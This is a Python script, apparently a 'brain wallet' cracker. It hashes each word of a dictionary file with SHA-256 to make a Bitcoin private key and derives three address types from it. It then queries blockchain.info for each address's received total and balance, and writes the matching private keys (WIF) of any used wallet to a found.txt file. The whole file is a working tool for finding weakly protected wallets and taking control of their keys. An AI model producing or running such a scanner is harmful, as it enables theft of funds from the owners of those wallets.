#!/usr/bin/env python3
from __future__ import annotations
import argparse, io, sys, time, logging, hashlib, binascii
import requests, base58
from coincurve import PrivateKey
try:
    from bech32 import bech32_encode, convertbits
    _HAS_BECH32 = True
except Exception:
    _HAS_BECH32 = False
from concurrent.futures import ThreadPoolExecutor, as_completed

# === Crypto helpers ===
def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def hash160(b: bytes) -> bytes:
    return hashlib.new('ripemd160', hashlib.sha256(b).digest()).digest()

def base58check(prefix: bytes, payload: bytes) -> str:
    raw = prefix + payload
    chk = sha256(sha256(raw))[:4]
    return base58.b58encode(raw + chk).decode()

def privhex_from_passphrase(word: str) -> str:
    return sha256(word.encode('utf-8')).hex()

def wif_from_privhex(priv_hex: str, compressed: bool = True) -> str:
    b = bytes.fromhex(priv_hex)
    payload = b'\x80' + b + (b'\x01' if compressed else b'')
    chk = sha256(sha256(payload))[:4]
    return base58.b58encode(payload + chk).decode()

def btc_p2pkh(pub_bytes: bytes) -> str:
    return base58check(b'\x00', hash160(pub_bytes))

def btc_p2sh_p2wpkh(pub_bytes: bytes) -> str:
    redeem_script = b'\x00\x14' + hash160(pub_bytes)
    return base58check(b'\x05', hash160(redeem_script))

def btc_bech32(pub_bytes: bytes) -> str:
    if not _HAS_BECH32:
        raise RuntimeError("bech32 library not available (pip install bech32)")
    witprog = hash160(pub_bytes)
    data = convertbits(witprog, 8, 5, True)
    if data is None:
        raise RuntimeError("bech32.convertbits failed")
    data5 = [0] + data
    return bech32_encode("bc", data5)

# === HTTP helpers ===
def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0) -> float:
    try:
        r = session.get(url, timeout=timeout)
        r.raise_for_status()
    except Exception as e:
        logging.debug("HTTP error for %s: %s", url, e)
        return 0.0
    text = r.text.strip()
    try:
        return float(text)
    except Exception:
        pass
    try:
        j = r.json()
        for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received","result"):
            if isinstance(j, dict) and key in j:
                try:
                    return float(j[key])
                except Exception:
                    try:
                        return float(str(j[key]))
                    except Exception:
                        pass
    except Exception:
        pass
    return 0.0

def print_used_btc(word, label, addr, wif, recv_val, bal_val, fout):
    print("\n=== USED BTC WALLET FOUND ===")
    print(f"WORD: {word}")
    print(f"TYPE: {label}")
    print(f"ADDRESS: {addr}")
    print(f"WIF: {wif}")
    print(f"TOTAL_RECEIVED: {recv_val}")
    print(f"BALANCE: {bal_val}")
    print("============================\n")
    fout.write(f"{word},BTC,{label},{addr},{wif},{recv_val},{bal_val}\n")
    fout.flush()

def check_btc_address(session, word, label, addr, wif, args, fout):
    url_recv = f"{args.base_received}/{addr}"
    recv_val = _get_raw_numeric(session, url_recv, timeout=20.0)
    time.sleep(args.sleep)
    bal_val = 0.0
    if recv_val > 0:
        url_bal = f"{args.base_balance}/{addr}"
        bal_val = _get_raw_numeric(session, url_bal, timeout=20.0)
        time.sleep(args.sleep)
    if recv_val > 0 or bal_val > 0:
        logging.info("Found used BTC address %s %s (recv=%s bal=%s)", label, addr, recv_val, bal_val)
        print_used_btc(word, label, addr, wif, recv_val, bal_val, fout)
        return 1
    return 0

# === Main scanner ===
def main():
    ap = argparse.ArgumentParser(description="Brute sequential BTC scanner: 1,3,bc1q addresses")
    ap.add_argument("--dict", "-d", default="dictionary.txt", help="wordlist (one passphrase per line)")
    ap.add_argument("--out", "-o", default="found.txt", help="append CSV output")
    ap.add_argument("--sleep", type=float, default=0.5, help="seconds to sleep after each address check")
    ap.add_argument("--debug", action="store_true", help="debug logging")
    ap.add_argument("--base-received", default="https://blockchain.info/q/getreceivedbyaddress")
    ap.add_argument("--base-balance", default="https://blockchain.info/q/addressbalance")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    if not _HAS_BECH32:
        logging.warning("bech32 library not found; bc1q address generation will be skipped. Install: pip install bech32")

    try:
        fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
    except Exception as e:
        logging.error("Cannot open dictionary: %s", e)
        sys.exit(1)
    try:
        fout = open(args.out, "a", encoding="utf-8", buffering=1)
    except Exception as e:
        logging.error("Cannot open output file: %s", e)
        sys.exit(1)

    session = requests.Session()
    total = checked = found = 0
    start_time = time.time()
    current_word = None

    try:
        for raw in fdict:
            word = raw.strip()
            current_word = word
            if not word:
                continue
            total += 1
            try:
                priv_hex = privhex_from_passphrase(word)
                pk = PrivateKey(bytes.fromhex(priv_hex))
                pub_compressed = pk.public_key.format(compressed=True)
                wif = wif_from_privhex(priv_hex, compressed=True)
            except Exception as e:
                logging.debug("Derivation failed for '%s': %s", word, e)
                continue

            btc_addresses = [
                ("P2PKH", btc_p2pkh(pub_compressed)),
                ("P2SH-P2WPKH", btc_p2sh_p2wpkh(pub_compressed))
            ]
            if _HAS_BECH32:
                try:
                    btc_addresses.append(("Bech32", btc_bech32(pub_compressed)))
                except Exception as e:
                    logging.debug("Bech32 derivation error: %s", e)

            # Threaded check
            with ThreadPoolExecutor(max_workers=3) as executor:
                futures = [executor.submit(check_btc_address, session, word, label, addr, wif, args, fout)
                           for label, addr in btc_addresses]
                for fut in as_completed(futures):
                    found += fut.result()
                    checked += 1

            if total % 1000 == 0:
                elapsed = time.time() - start_time
                logging.info("Processed %d words — checked:%d found:%d — avg %.2f words/s",
                             total, checked, found, total / max(1.0, elapsed))

    except KeyboardInterrupt:
        print("\n*** INTERRUPTED by user ***")
        if current_word:
            print(f"Stopped while processing word: {current_word!r}")
    finally:
        session.close()
        fdict.close()
        fout.close()
        elapsed = time.time() - start_time
        logging.info("Finished. Total read: %d, checked:%d found:%d, elapsed %.1fs", total, checked, found, elapsed)

if __name__ == "__main__":
    main()